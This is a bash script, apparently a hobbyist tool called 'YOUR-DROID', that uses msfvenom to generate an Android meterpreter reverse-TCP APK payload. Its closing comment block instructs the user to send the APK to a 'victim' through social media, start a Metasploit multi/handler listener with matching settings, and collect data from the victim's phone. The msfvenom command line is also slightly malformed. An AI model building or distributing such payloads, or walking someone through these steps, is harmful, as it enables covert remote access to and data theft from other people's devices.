#!/usr/bin/env bash
echo -e "

█▄█ █▀█ █░█ █▀█ ▄▄ █▀▄ █▀█ █▀█ █ █▀▄
░█░ █▄█ █▄█ █▀▄ ░░ █▄▀ █▀▄ █▄█ █ █▄▀" | lolcat
echo
echo -e "────────────█───────────────█
────────────██─────────────██
─────────────███████████████
────────────█████████████████
───────────███████████████████
──────────████──█████████──████
─────────███████████████████████
────────█████████████████████████
────────█████████████████████████
───███──▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒──███
──█████─█████████████████████████─█████
──█████─████████████████──███████─█████
──█████─██████────────█──█────███─█████
──█████─█████─▓▓▓▓▓▓▓█──█▓▓─▓─███─█████
──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
──█████─█████────█──█─────────███─█████
──█████─█████████──██████████████─█████
───███──████████──███████████████──███
────────█████████████████████████
─────────███████████████████████
──────────█████████████████████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
──────────────████─────████
" | pv -qL 500 | lolcat
echo
echo -e "
█▄░█ █▄░█ █▀▀
█░▀█ █░▀█ █▄▄" | lolcat
echo
printf "\033[1;34mWHAT IS YOUR NAME==> \033[0m"
read name
printf "\033[1;34mWELCOME ${name^^} TO YOUR-DROID \033[0m\n"
echo
#.............. selection...................
printf "\033[1;42mSELECT AN OPTION \033[0m\n"
echo
printf "\033[1;34m1>TO MAKE A PAYLOAD OF METASPLOIT \033[0m\n"
printf "\033[1;34m2>TO EXIT \033[0m\n"
echo
while true; do
printf "\033[1;34mWHICH IS THE OPTION YOU SELECTED==> \033[0m"
#.................programing................
read opt
if [[ $opt = '1' || $opt = '01' ]]; then
printf "\033[1;34mWHICH NAME U WANTED TO GIVE TO YOUR PAYLOAD==> \033[0m"
read name
printf "\033[1;36mIT'S STARTING............\033[m\n"
echo
printf "\033[1;36mPLEASE WAIT, IT TAKE SOME TIME TO CREATE \033[0m\n"
echo
echo

msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1111 R>${name}.apk /sdcard
echo
printf "\033[1;31mITS SUCESSFULY INSTALLED IN 'YOUR_DROID' \033[0m\n"
break

elif [[ $opt = '2' || $opt = 'exit' ]]; then
exit 1

else
echo
printf "\033[1;41m[!]please select an valid option \033[0m\n"
echo
fi
done
echo
printf "\033[1;44mif you want more information type 'nano your_droid after exiting from the tool \033[0m\n"
printf "\033[1;44mthen scrol down then you can see help menu read it then you can understand all \033[0m\n"
printf "\033[1;44mTHANK YOU!!! \033[0m\n"
echo
#<====================help menu===============>
#paylod is created in 'your_droid' directory ok
# then the paylod is created in 'your_droid' to see that payload
 #type 'ls' then you can see that paylod and when u want to move it
 #to your sdcard type 'mv <name of your payload> /sdcard' it would
 #sucessfully move to you sdcard
#after making payload in you sdcard to exploit your victims device
#follow these steps:-

#1) 1st you want to send that paylod to your victim through any
#social medias or other ways

#2) when the victim downlorded your payload then open metasploit by
#'msfconsole' and then do there

#   *use explot multi/handler
#  *set payload android/meterpreter/reverse_tcp
#   *set lhost 127.0.0.1
#   *set lport 1111
#   * exploit
#by following these step you can collect datas from victims phone
#<=============================================>




